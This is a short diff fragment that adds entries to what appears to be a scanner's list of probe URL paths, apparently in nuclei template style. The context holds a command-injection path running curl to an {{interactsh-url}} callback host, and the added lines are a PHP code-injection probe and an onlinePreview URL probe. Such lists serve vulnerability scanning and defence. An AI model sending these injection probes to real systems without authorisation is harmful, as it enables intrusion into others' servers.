@@ -3803,3 +3803,5 @@ pathCache.php
 /misc/`curl${IFS}{{interactsh-url}}`/..;/index.html
 /dana-na/auth/url_6/welcome.cgi
 /dana/home/index.cgi
+/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5(
+/onlinePreview?url={{base64(
